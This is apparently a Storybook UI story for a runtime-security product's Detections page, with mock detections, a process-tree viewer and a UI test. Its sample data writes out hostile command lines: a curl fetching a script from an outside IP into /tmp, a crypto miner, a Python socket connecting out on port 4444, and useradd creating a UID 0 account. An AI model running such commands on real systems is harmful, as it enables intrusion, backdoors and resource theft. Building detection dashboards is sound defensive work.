import { useState } from "react";
import type { Meta, StoryObj } from "@storybook/react-vite";
import { expect, userEvent, within } from "storybook/test";
import { Activity, Cpu, FileLock, ScrollText, Server, ShieldAlert } from "lucide-react";
import { ProductFrame } from "../ProductFrame";
import { PageHeader } from "../../components/PageHeader";
import { Button } from "../../components/Button";
import { KpiCard, KpiGrid } from "../../components/Kpi";
import { Panel } from "../../components/Panel";
import { FilterBar, FacetFilter, TimeRangePicker } from "../../components/Filters";
import { SearchInput } from "../../components/Controls";
import { DataTable, type Column } from "../../components/DataTable";
import { Badge, SeverityBadge, StatusBadge } from "../../components/Badge";
import { EntityChip } from "../../components/EntityChip";
import { StackedBarChart } from "../../charts/StackedBarChart";
import { SEVERITY_META, TONE_COLORS, type Severity } from "../../tokens/levels";
import { rng, timeLabels } from "../mocks";

const nav = [
  { id: "detections", label: "Detections", icon: ShieldAlert, count: 12 },
  { id: "events", label: "Events", icon: Activity },
  { id: "processes", label: "Processes", icon: Cpu },
  { id: "fim", label: "File integrity", icon: FileLock },
  { id: "policies", label: "Policies", icon: ScrollText, count: 34 },
  { id: "hosts", label: "Hosts", icon: Server },
];

const meta = {
  title: "Products/Runtime",
  parameters: { layout: "fullscreen" },
} satisfies Meta;

export default meta;
type Story = StoryObj<typeof meta>;

interface ProcNode {
  pid: number;
  cmd: string;
  user: string;
  flagged?: boolean;
  children?: ProcNode[];
}

interface Detection {
  id: string;
  severity: Severity;
  title: string;
  rule: string;
  host: string;
  container?: string;
  process: string;
  time: string;
  tree: ProcNode;
}

const detections: Detection[] = [
  {
    id: "d1",
    severity: "high",
    title: "Shell spawned in container",
    rule: "container.shell_spawned",
    host: "worker-prod-04",
    container: "orders-api-6f9c7d",
    process: "/bin/sh -c id; uname -a",
    time: "13:58:12",
    tree: {
      pid: 4120,
      cmd: "containerd-shim-runc-v2 -namespace k8s.io -id 7d1e…",
      user: "root",
      children: [
        {
          pid: 4188,
          cmd: "node /app/server.js",
          user: "app",
          children: [{ pid: 30551, cmd: "/bin/sh -c id; uname -a", user: "app", flagged: true, children: [{ pid: 30552, cmd: "id", user: "app" }] }],
        },
      ],
    },
  },
  {
    id: "d2",
    severity: "critical",
    title: "Crypto miner executed from /tmp",
    rule: "proc.cryptominer_exec",
    host: "worker-prod-09",
    container: "reports-cron-28831",
    process: "/tmp/.x/kworker -o pool:3333",
    time: "13:41:07",
    tree: {
      pid: 2210,
      cmd: "containerd-shim-runc-v2 -namespace k8s.io -id 3c90…",
      user: "root",
      children: [
        {
          pid: 2264,
          cmd: "sh -c /opt/reports/run.sh",
          user: "app",
          children: [
            {
              pid: 18803,
              cmd: "curl -fsSL http://203.0.113.181/x.sh -o /tmp/.x/k",
              user: "app",
              flagged: true,
              children: [{ pid: 18840, cmd: "/tmp/.x/kworker -o 198.51.100.201:3333 --donate-level 0", user: "app", flagged: true }],
            },
          ],
        },
      ],
    },
  },
  {
    id: "d3",
    severity: "high",
    title: "Unexpected outbound to 198.51.100.201:4444",
    rule: "net.outbound_unexpected_port",
    host: "api-prod-03",
    container: "payments-api-55b8",
    process: "python3 -c import socket…",
    time: "13:22:45",
    tree: {
      pid: 980,
      cmd: "containerd-shim-runc-v2 -namespace k8s.io -id 91fa…",
      user: "root",
      children: [{ pid: 1012, cmd: "gunicorn payments.wsgi -w 4", user: "app", children: [{ pid: 22107, cmd: "python3 -c 'import socket,os;s=socket.socket();s.connect((\"198.51.100.201\",4444))'", user: "app", flagged: true }] }],
    },
  },
  {
    id: "d4",
    severity: "high",
    title: "/etc/passwd modified",
    rule: "fim.sensitive_file_write",
    host: "db-prod-02",
    process: "useradd -o -u 0 backup2",
    time: "12:57:30",
    tree: {
      pid: 1,
      cmd: "/sbin/init",
      user: "root",
      children: [{ pid: 812, cmd: "sshd: /usr/sbin/sshd -D", user: "root", children: [{ pid: 40211, cmd: "bash", user: "root", children: [{ pid: 40290, cmd: "useradd -o -u 0 backup2", user: "root", flagged: true }] }] }],
    },
  },
  {
    id: "d5",
    severity: "medium",
    title: "Kernel module loaded",
    rule: "kernel.module_load",
    host: "edge-fra-02",
    process: "insmod /lib/modules/6.8.0/extra/nf_tap.ko",
    time: "11:15:02",
    tree: {
      pid: 1,
      cmd: "/sbin/init",
      user: "root",
      children: [{ pid: 655, cmd: "/usr/bin/ansible-playbook site.yml", user: "root", children: [{ pid: 7712, cmd: "insmod /lib/modules/6.8.0/extra/nf_tap.ko", user: "root", flagged: true }] }],
    },
  },
  {
    id: "d6",
    severity: "medium",
    title: "ptrace on sshd",
    rule: "proc.ptrace_attach",
    host: "api-prod-01",
    process: "gdb -p 812",
    time: "10:49:51",
    tree: {
      pid: 1,
      cmd: "/sbin/init",
      user: "root",
      children: [{ pid: 3001, cmd: "tmux new -s debug", user: "deniz", children: [{ pid: 3044, cmd: "bash", user: "deniz", children: [{ pid: 3190, cmd: "sudo gdb -p 812", user: "root", flagged: true }] }] }],
    },
  },
];

const columns: Column<Detection>[] = [
  { id: "sev", header: "Severity", width: "96px", sortValue: (d) => SEVERITY_META[d.severity].rank, cell: (d) => <SeverityBadge severity={d.severity} /> },
  {
    id: "title",
    header: "Detection",
    width: "28%",
    cell: (d) => (
      <span className="flex min-w-0 flex-col">
        <span className="truncate font-medium">{d.title}</span>
        <span className="truncate font-mono text-2xs text-fg-muted">{d.rule}</span>
      </span>
    ),
  },
  {
    id: "where",
    header: "Host / container",
    cell: (d) => (
      <span className="flex flex-wrap gap-1">
        <EntityChip kind="host" value={d.host} hideKind />
        {d.container && <EntityChip kind="container" value={d.container} hideKind />}
      </span>
    ),
  },
  {
    id: "proc",
    header: "Process",
    width: "24%",
    cell: (d) => (
      <span className="block truncate font-mono text-xs" title={d.process}>
        {d.process}
      </span>
    ),
  },
  { id: "time", header: "Time", align: "right", mono: true, sortValue: (d) => d.time, cell: (d) => d.time },
];

function ProcessTree({ node }: { node: ProcNode }) {
  return (
    <li className="flex flex-col">
      <span
        className={
          node.flagged
            ? "flex items-start gap-2 rounded bg-danger-soft px-1.5 py-1 text-danger-text"
            : "flex items-start gap-2 px-1.5 py-1"
        }
      >
        <span className="w-12 shrink-0 font-mono text-2xs text-fg-muted">{node.pid}</span>
        <span className="min-w-0 grow font-mono text-xs break-all">{node.cmd}</span>
        <span className="shrink-0 font-mono text-2xs text-fg-muted">{node.user}</span>
      </span>
      {node.children && node.children.length > 0 && (
        <ul className="ml-3 flex flex-col border-l border-line pl-2">
          {node.children.map((c) => (
            <ProcessTree key={c.pid} node={c} />
          ))}
        </ul>
      )}
    </li>
  );
}

const HOURS = 24;
const hours = timeLabels(HOURS, 60);
const sevOrder: Severity[] = ["info", "low", "medium", "high", "critical"];
const r = rng(77);
const perHour = hours.map((_, i) =>
  sevOrder.map((s) => {
    const base = { info: 60, low: 22, medium: 9, high: 3, critical: 0.4 }[s];
    const burst = i >= 18 && i <= 21 && (s === "high" || s === "critical") ? 3 : 1;
    return Math.round(base * burst * (0.6 + r() * 0.8));
  }),
);

/** Runtime detections: events per hour, detections and the process tree of the selected one. */
export const Detections: Story = {
  render: () => {
    const [range, setRange] = useState("24h");
    const [sev, setSev] = useState<string[]>([]);
    const [selected, setSelected] = useState("d2");
    const rows = detections.filter((d) => sev.length === 0 || sev.includes(d.severity));
    const current = detections.find((d) => d.id === selected);
    return (
      <ProductFrame product="runtime" nav={nav} active="detections">
        <PageHeader
          title="Detections"
          description="eBPF sensor 0.14 on 46 hosts and 312 pods · 34 policies enforced"
          meta={<StatusBadge tone="danger">2 critical open</StatusBadge>}
          actions={
            <>
              <SearchInput label="Search detections, hosts or processes" className="w-72" />
              <Button size="md" icon={<ScrollText />}>
                Edit policies
              </Button>
            </>
          }
        />
        <FilterBar>
          <TimeRangePicker value={range} onChange={setRange} />
          <FacetFilter
            label="Severity"
            selected={sev}
            onChange={setSev}
            options={(["critical", "high", "medium", "low"] as Severity[]).map((s) => ({
              value: s,
              label: SEVERITY_META[s].label,
              count: detections.filter((d) => d.severity === s).length,
            }))}
          />
        </FilterBar>
        <KpiGrid>
          <KpiCard label="Open detections" value="12" unit="last 24 h" tone="danger" delta={{ label: "+5 vs. yesterday", direction: "up", intent: "bad" }} />
          <KpiCard label="Events · 24 h" value="2.31M" unit="exec, net, file" delta={{ label: "98.7% dropped by policy" }} />
          <KpiCard label="Sensors reporting" value="46" unit="of 47 hosts" delta={{ label: "edge-ist-01 silent for 2 h", intent: "bad" }} />
          <KpiCard label="FIM changes · 24 h" value="31" unit="files" delta={{ label: "1 outside change window", intent: "bad" }} />
        </KpiGrid>
        <Panel title="Events per hour" description="Matched rules, by severity">
          <StackedBarChart
            label="Runtime events per hour by severity"
            categories={hours}
            segments={sevOrder.map((s) => ({ id: s, name: SEVERITY_META[s].label, color: TONE_COLORS[SEVERITY_META[s].tone] }))}
            values={perHour}
            height={150}
            xTicks={7}
          />
        </Panel>
        <div className="grid gap-2.5 xl:grid-cols-[minmax(0,3fr)_minmax(340px,2fr)]">
          <Panel title="Detections" description="Select a row to see its process tree" flush>
            <DataTable
              label="Runtime detections"
              columns={columns}
              rows={rows}
              getRowId={(d) => d.id}
              onRowClick={(d) => setSelected(d.id)}
              activeRowId={selected}
              defaultSort={{ id: "time", direction: "desc" }}
              minWidth={860}
            />
          </Panel>
          <Panel
            title="Process tree"
            description={current ? `${current.title} · ${current.host}` : "No detection selected"}
            actions={current && <Badge mono>{current.rule}</Badge>}
            aria-label="Process tree"
          >
            {current ? (
              <div className="flex flex-col gap-2">
                <ul aria-label={`Process tree for ${current.title}`} className="flex flex-col text-sm">
                  <ProcessTree node={current.tree} />
                </ul>
                <div className="flex flex-wrap gap-1.5 border-t border-line pt-2">
                  <Button size="sm" variant="danger">
                    Kill process
                  </Button>
                  <Button size="sm">Isolate host</Button>
                  <Button size="sm" variant="ghost">
                    Open in SIEM
                  </Button>
                </div>
              </div>
            ) : (
              <p className="py-6 text-center text-sm text-fg-muted">Select a detection</p>
            )}
          </Panel>
        </div>
      </ProductFrame>
    );
  },
  play: async ({ canvasElement }) => {
    const c = within(canvasElement);
    const tree = () => c.getByRole("list", { name: /^Process tree for/ });
    await expect(within(tree()).getByText(/kworker -o 198\.51\.100\.201:3333/)).toBeInTheDocument();
    const table = c.getByRole("table", { name: "Runtime detections" });
    await userEvent.click(within(table).getByText("Shell spawned in container"));
    await expect(tree()).toHaveAccessibleName("Process tree for Shell spawned in container");
    await expect(within(tree()).getByText("node /app/server.js")).toBeInTheDocument();
    await expect(within(tree()).queryByText(/kworker/)).not.toBeInTheDocument();
  },
};
